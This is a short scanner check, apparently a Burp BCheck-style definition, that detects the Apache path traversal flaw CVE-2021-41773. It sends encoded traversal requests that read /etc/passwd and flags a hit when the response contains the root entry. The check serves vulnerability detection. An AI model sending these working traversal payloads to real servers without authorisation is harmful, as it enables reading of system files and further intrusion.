metadata:
    language: v1-beta
    name: "CVE-2021-41773"
    description: "Apache Path Traversal Vulnerability"
    author: "Akshay Borase"
    tags: "Apache Path Traversal Vulnerability"


run for each:
    potential_path =
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"



given host then
    send request called check:
        method: "GET"
        path: {potential_path}
        

    if {check.response} matches "root:x:0:" then
        report issue:
            severity: high
            confidence: firm
            detail: `CVE-2021-41773 found at {potential_path}.`
            remediation: "Update Apache Server"
    end if
